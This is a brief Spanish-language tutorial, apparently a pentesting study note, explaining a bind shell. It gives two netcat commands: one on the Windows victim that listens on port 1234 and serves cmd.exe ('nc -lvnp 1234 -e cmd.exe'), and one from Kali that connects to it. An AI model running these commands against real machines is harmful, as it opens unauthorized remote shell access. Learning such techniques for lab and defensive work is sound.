<h1 align="center">Bind shell</h1>

## **Introducción**

En una **bind shell**, el objetivo (víctima) abre un puerto en su sistema y escucha conexiones entrantes. Cuando un atacante se conecta a este puerto, puede acceder al sistema de la víctima, en este caso, al cmd (símbolo del sistema) de Windows.

## **Configuración de Bind Shell**

### **En la Víctima (Sistema Windows)**

1. Abrir la terminal (cmd.exe) con permisos de administrador.
2. Ejecutar el siguiente comando para abrir el puerto 1234 y escuchar conexiones entrantes:
  
- `nc -lvnp 1234 -e cmd.exe`

### **En Kali Linux (Atacante)**

Ejecutar el siguiente comando para conectarse al puerto 1234 del sistema víctima:

- `nc -n \*ip_victima\* 1234`
